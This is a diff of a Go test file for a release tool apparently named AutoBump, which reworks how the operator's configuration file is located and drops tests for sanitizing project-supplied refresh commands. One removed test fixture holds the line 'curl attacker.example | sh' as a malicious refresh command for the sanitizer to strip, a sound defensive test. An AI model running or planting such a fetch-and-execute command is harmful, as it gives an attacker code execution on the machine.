-		require.Len(t, cfg.Projects, 1)
-		assert.Equal(t, "/home/user/repo1", cfg.Projects[0].Path)
-		assert.Equal(t, "repo1", cfg.Projects[0].Name)
+		assert.Contains(t, string(data), "fork-dot")
 	})
 
-	t.Run("should return error when config file does not exist", func(t *testing.T) {
+	t.Run("should return an error when the file does not exist", func(t *testing.T) {
 		t.Parallel()
 
 		// given
 		configPath := filepath.Join(t.TempDir(), "nonexistent.yaml")
 
 		// when
-		cfg, err := entities.ReadConfig(configPath)
+		data, err := entities.ReadLayerData(configPath)
 
 		// then
 		require.Error(t, err)
-		assert.Nil(t, cfg)
-	})
-
-	t.Run("should derive project name from path when name is empty", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		tmpDir := t.TempDir()
-		configPath := filepath.Join(tmpDir, "autobump.yaml")
-		content := `languages:
-  go:
-    extensions:
-      - 'go'
-projects:
-  - path: 'git@github.com:org/my-repo.git'
-`
-		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))
-
-		// when
-		cfg, err := entities.ReadConfig(configPath)
-
-		// then
-		require.NoError(t, err)
-		assert.Equal(t, "my-repo", cfg.Projects[0].Name)
-	})
-
-	t.Run("should read token from file when token value is a file path", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		tmpDir := t.TempDir()
-		tokenFile := filepath.Join(tmpDir, "token.txt")
-		require.NoError(t, os.WriteFile(tokenFile, []byte("file-token-value"), 0o644))
-		configPath := filepath.Join(tmpDir, "autobump.yaml")
-		content := "languages:\n  go:\n    extensions:\n      - 'go'\ngithub_access_token: '" + tokenFile + "'\n"
-		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))
-
-		// when
-		cfg, err := entities.ReadConfig(configPath)
-
-		// then
-		require.NoError(t, err)
-		assert.Equal(t, "file-token-value", cfg.GitHubAccessToken)
+		assert.Nil(t, data)
 	})
 }
 
-func TestDecodeConfig(t *testing.T) {
+func TestFindOperatorConfig(t *testing.T) {
 	t.Parallel()
 
-	t.Run("should return error when YAML is invalid", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		data := []byte("invalid: [yaml: {broken")
-
-		// when
-		cfg, err := entities.DecodeConfig(data, false)
-
-		// then
-		require.Error(t, err)
-		assert.Nil(t, cfg)
-	})
-
-	t.Run("should reject unknown fields when strict is true", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		data := []byte("unknown_field: 'value'\nlanguages:\n  go:\n    extensions:\n      - 'go'\n")
-
-		// when
-		cfg, err := entities.DecodeConfig(data, true)
-
-		// then
-		require.Error(t, err)
-		assert.Nil(t, cfg)
-	})
-
-	t.Run("should accept unknown fields when strict is false", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		data := []byte("unknown_field: 'value'\nlanguages:\n  go:\n    extensions:\n      - 'go'\n")
-
-		// when
-		cfg, err := entities.DecodeConfig(data, false)
-
-		// then
-		require.NoError(t, err)
-		require.NotNil(t, cfg)
-		assert.Contains(t, cfg.LanguagesConfig, "go")
-	})
-}
-
-func TestFindConfigOnMissing(t *testing.T) {
-	t.Parallel()
-
-	t.Run("should return provided path when not empty", func(t *testing.T) {
+	t.Run("should return the path it was given", func(t *testing.T) {
 		t.Parallel()
 
 		// given
 		configPath := "/some/explicit/path.yaml"
 
 		// when
-		result := entities.FindConfigOnMissing(configPath)
+		result := entities.FindOperatorConfig(configPath)
 
 		// then
 		assert.Equal(t, configPath, result)
 	})
-
-	t.Run("should search default locations when path is empty", func(t *testing.T) {
-		t.Parallel()
-
-		// given / when
-		result := entities.FindConfigOnMissing("")
-
-		// then
-		assert.NotEmpty(t, result)
-	})
 }
 
-// These cases cannot join TestFindConfigOnMissing above: it calls t.Parallel(), and t.Setenv
+// These cases cannot join TestFindOperatorConfig above: it calls t.Parallel(), and t.Setenv
 // and t.Chdir panic under a parallel parent.
-func TestFindConfigOnMissingSearchOrder(t *testing.T) {
-	// The bug this ordering exists to prevent: AutoBump runs with the repository it is releasing
-	// as the working directory, that repository legitimately carries its own `.autobump.yaml`,
-	// and picking it as the GLOBAL config silently drops every setting honoured only from the
-	// operator's own file -- `refresh_commands` above all.
-	t.Run("should prefer the home config over one in the working directory", func(t *testing.T) {
+func TestFindOperatorConfigSearchOrder(t *testing.T) {
+	// The bug this ordering exists to prevent: AutoBump runs with the repository it is
+	// releasing as the working directory, and that repository legitimately carries its own
+	// `.autobump.yaml`. Reading it as the OPERATOR's configuration does not reorder a
+	// preference, it substitutes a project's overrides for the operator's -- so the
+	// project's settings stop being overrides and replace the layers beneath them.
+	t.Run("should prefer the home directory", func(t *testing.T) {
 		// given
 		home := t.TempDir()
 		t.Setenv("HOME", home)
-		writeYAML(t, filepath.Join(home, ".autobump.yaml"))
-		project := t.TempDir()
-		writeYAML(t, filepath.Join(project, ".autobump.yaml"))
-		t.Chdir(project)
+		homeConfig := writeNamedConfig(t, home, ".autobump.yaml", "versioning: 'semver'\n")
+
+		repo := t.TempDir()
+		writeNamedConfig(t, repo, ".autobump.yaml", "versioning: 'fork-dot'\n")
+		t.Chdir(repo)
 
 		// when
-		result := entities.FindConfigOnMissing("")
+		result := entities.FindOperatorConfig("")
 
 		// then
-		assert.Equal(t, filepath.Join(home, ".autobump.yaml"), result)
+		assert.Equal(t, homeConfig, result)
 	})
 
-	t.Run("should not adopt the project's own config as the global one", func(t *testing.T) {
-		// given
-		// The case this replaces used to resolve to the project's file, on the grounds that an
-		// operator with no home config has no operator-level settings to lose. True as far as it
-		// goes, but adopting the file as the *global* config does more than reorder a preference:
-		// the project's overrides stop being overrides and replace the published defaults,
-		// SanitizeUntrustedLanguages never runs so its refresh commands are honoured, and it is
-		// decoded strictly although a project file is allowed to be partial.
+	t.Run("should not adopt the project's own config as the operator's", func(t *testing.T) {
+		// given -- an operator with nothing in $HOME, standing in the repository they are
+		// releasing, which carries its own overrides
 		t.Setenv("HOME", t.TempDir())
-		project := t.TempDir()
-		writeYAML(t, filepath.Join(project, ".autobump.yaml"))
-		t.Chdir(project)
+
+		repo := t.TempDir()
+		writeNamedConfig(t, repo, ".autobump.yaml", "versioning: 'fork-dot'\n")
+		t.Chdir(repo)
 
 		// when
-		result := entities.FindConfigOnMissing("")
+		result := entities.FindOperatorConfig("")
 
 		// then
-		assert.Equal(t, entities.DefaultConfigURL, result,
-			"a file in the working directory belongs to the project, and a project's config is "+
-				"merged on top of the global one rather than standing in for it")
+		assert.Empty(t, result,
+			"a file in the working directory belongs to the project, and a project's config "+
+				"is merged on top of the operator's rather than standing in for it")
 	})
 
-	// The search that was removed also reached `.`, `.config/` and `configs/` -- all relative to
-	// the working directory, which is the repository being released -- under four name patterns,
-	// not just the `.autobump.yaml` the case above writes. Each removed location is pinned
-	// separately, because dropping the fallback is what this change is for and a reinstated
-	// wider search would otherwise only be caught for one of the four names in one of the three
-	// directories.
-	for _, removed := range []string{
-		"autobump.yaml",
-		filepath.Join(".config", "autobump.yaml"),
-		filepath.Join("configs", "autobump.yaml"),
-	} {
-		t.Run("should ignore "+removed+" in the working directory", func(t *testing.T) {
+	// Every name and location the older, wider search also matched. None of them may come
+	// back: each one is a way for the repository being released to answer a question that
+	// is the operator's.
+	workingDirectoryNames := []string{
+		"autobump.yaml", ".config/autobump.yaml", "configs/autobump.yaml",
+	}
+	for _, name := range workingDirectoryNames {
+		t.Run("should ignore "+name+" in the working directory", func(t *testing.T) {
 			// given
 			t.Setenv("HOME", t.TempDir())
-			project := t.TempDir()
-			path := filepath.Join(project, removed)
-			// The permission rule compares the mode against 0600 and cannot tell a
-			// directory from a file, so it flags the tightest mode a directory can have
-			// and still be entered. Same suppression as makeDir in the command tests.
-			// nosemgrep: go.lang.correctness.permissions.file_permission.incorrect-default-permission
-			require.NoError(t, os.MkdirAll(filepath.Dir(path), 0o700))
-			writeYAML(t, path)
-			t.Chdir(project)
+
+			repo := t.TempDir()
+			//nosemgrep: go.lang.correctness.permissions.file_permission.incorrect-default-permission
+			require.NoError(t, os.MkdirAll(filepath.Dir(filepath.Join(repo, name)), 0o700))
+			require.NoError(t, os.WriteFile(
+				filepath.Join(repo, name), []byte("versioning: 'fork-dot'\n"), 0o600,
+			))
+			t.Chdir(repo)
 
 			// when
-			result := entities.FindConfigOnMissing("")
+			result := entities.FindOperatorConfig("")
 
 			// then
-			assert.Equal(t, entities.DefaultConfigURL, result,
-				"the wider search that used to reach this location was removed with the fallback")
+			assert.Empty(t, result)
 		})
 	}
 
-	t.Run("should fall back to the published default configuration when the home has none", func(t *testing.T) {
+	t.Run("should report no operator configuration when the home has none", func(t *testing.T) {
 		// given
 		t.Setenv("HOME", t.TempDir())
 		t.Chdir(t.TempDir())
 
 		// when
-		result := entities.FindConfigOnMissing("")
+		result := entities.FindOperatorConfig("")
 
-		// then
-		assert.Equal(t, entities.DefaultConfigURL, result)
+		// then -- not an error: the built-in defaults are the base of every run
+		assert.Empty(t, result)
 	})
 
-	t.Run("should return the given path untouched when one is supplied", func(t *testing.T) {
+	t.Run("should return the named path without searching", func(t *testing.T) {
 		// given
 		home := t.TempDir()
 		t.Setenv("HOME", home)
-		writeYAML(t, filepath.Join(home, ".autobump.yaml"))
+		writeNamedConfig(t, home, ".autobump.yaml", "versioning: 'semver'\n")
 
 		// when
-		result := entities.FindConfigOnMissing("/explicit/path.yaml")
+		result := entities.FindOperatorConfig("/explicit/path.yaml")
 
 		// then
-		assert.Equal(t, "/explicit/path.yaml", result,
-			"an explicit -c must win over any discovery")
+		assert.Equal(t, "/explicit/path.yaml", result)
 	})
-}
-
-// writeYAML creates a minimal, valid config file at the given path.
-func writeYAML(t *testing.T, path string) {
-	t.Helper()
-
-	require.NoError(t, os.WriteFile(path, []byte("languages:\n"), 0o600))
 }
 
 func TestResolveVersioning(t *testing.T) {
@@ -1287,65 +1209,5 @@ func TestResolveVersioning(t *testing.T) {
 
 		// then
 		assert.Equal(t, entities.VersioningForkDot, mode)
-	})
-}
-
-func TestSanitizeUntrustedLanguages(t *testing.T) {
-	t.Parallel()
-
-	t.Run("should drop refresh commands when a project declares its own", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		overrides := map[string]entities.LanguageConfig{
-			"typescript": {
-				Extensions: []string{"ts"},
-				RefreshCommands: []entities.RefreshCommand{
-					{Run: []string{"sh", "-c", "curl attacker.example | sh"}, Files: []string{"yarn.lock"}},
-				},
-			},
-		}
-
-		// when
-		sanitized := entities.SanitizeUntrustedLanguages(overrides)
-
-		// then
-		assert.Nil(t, sanitized["typescript"].RefreshCommands)
-		assert.Equal(t, []string{"ts"}, sanitized["typescript"].Extensions, "other fields must survive")
-	})
-
-	t.Run("should not mutate the config it was given", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		overrides := map[string]entities.LanguageConfig{
-			"typescript": {
-				RefreshCommands: []entities.RefreshCommand{
-					{Run: []string{"sh", "-c", "true"}, Files: []string{"yarn.lock"}},
-				},
-			},
-		}
-
-		// when
-		entities.SanitizeUntrustedLanguages(overrides)
-
-		// then
-		assert.Len(t, overrides["typescript"].RefreshCommands, 1)
-	})
-
-	t.Run("should keep an empty list so a project can opt out", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		overrides := map[string]entities.LanguageConfig{
-			"typescript": {RefreshCommands: []entities.RefreshCommand{}},
-		}
-
-		// when
-		sanitized := entities.SanitizeUntrustedLanguages(overrides)
-
-		// then
-		assert.NotNil(t, sanitized["typescript"].RefreshCommands)
-		assert.Empty(t, sanitized["typescript"].RefreshCommands)
 	})
 }
